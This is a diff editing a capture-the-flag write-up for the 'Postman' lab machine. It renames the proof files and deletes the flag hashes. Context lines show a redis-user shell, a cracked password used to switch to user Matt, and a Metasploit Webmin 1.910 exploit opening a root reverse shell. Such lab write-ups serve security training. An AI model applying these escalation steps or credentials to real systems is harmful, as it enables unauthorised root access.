@@ -1,7 +1,7 @@
 ---
 title: Postman
 slug: Postman
-tags: [Linux, Webmin-1910-Exploit, Redis, Vulnerability Research]
+tags: [Webmin-1910-Exploit, Vulnerability Research]
 ---
 ## Executive Summary
 
@@ -332,9 +332,9 @@ redis@Postman:/home$ ls
 Matt
 redis@Postman:/home$ cd Matt
 redis@Postman:/home/Matt$ ls
-user.txt
-redis@Postman:/home/Matt$ cat user.txt
-cat: user.txt: Permission denied
+local-proof.txt
+redis@Postman:/home/Matt$ cat local-proof.txt
+cat: local-proof.txt: Permission denied
 redis@Postman:/home/Matt$ ls -la
 total 52
 drwxr-xr-x 6 Matt Matt 4096 Sep 11  2019 .
@@ -348,7 +348,7 @@ drwxrwxr-x 3 Matt Matt 4096 Aug 25  2019 .local
 -rw-r--r-- 1 Matt Matt  807 Aug 25  2019 .profile
 -rw-rw-r-- 1 Matt Matt   66 Aug 26  2019 .selected_editor
 drwx------ 2 Matt Matt 4096 Aug 26  2019 .ssh
--rw-rw---- 1 Matt Matt   33 Oct 14 16:58 user.txt
+-rw-rw---- 1 Matt Matt   33 Oct 14 16:58 local-proof.txt
 -rw-rw-r-- 1 Matt Matt  181 Aug 25  2019 .wget-hsts
 redis@Postman:/home/Matt$ cd .ssh
 -bash: cd: .ssh: Permission denied
@@ -399,7 +399,7 @@ redis@Postman:~$ find / -user Matt 2>/dev/null
 /home/Matt/.bash_history
 /home/Matt/.gnupg
 /home/Matt/.ssh
-/home/Matt/user.txt
+/home/Matt/local-proof.txt
 /home/Matt/.selected_editor
 /home/Matt/.local
 /home/Matt/.local/share
@@ -460,8 +460,7 @@ We get pass `computer2008`:
 redis@Postman:~$ su Matt
 Password:
 Matt@Postman:/var/lib/redis$ cd /home/Matt/
-Matt@Postman:~$ cat user.txt
-38e9704173334cdf2f450c2393b44bc4
+Matt@Postman:~$ cat local-proof.txt
 ```
 ## Privilege Escalation Path
 ## Webmin-1.910 Exploit
@@ -549,8 +548,7 @@ msf exploit(linux/http/webmin_packageup_rce) > run
 [*] Command shell session 1 opened (10.10.14.122:9001 -> 10.129.2.1:56252) at 2025-10-14 09:51:44 -0700
 whoami
 root
-cat /root/root.txt
-efd4e9a2bc51c36b60522f953581815d
+cat /root/privileged-proof.txt
 ```
 
 ---
